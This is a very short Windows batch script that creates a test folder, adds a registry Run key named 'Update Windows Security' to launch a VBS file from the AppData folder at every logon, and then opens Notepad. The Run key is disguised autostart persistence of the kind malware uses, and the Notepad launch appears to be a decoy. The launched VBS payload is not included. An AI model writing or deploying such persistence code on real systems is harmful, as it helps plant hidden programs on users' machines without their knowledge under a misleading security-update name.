@echo off
mkdir testtest
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Update Windows Security" /t REG_SZ /d "%appdata%\windowsSecurity\1_update_security.vbs" /f
notepad.exe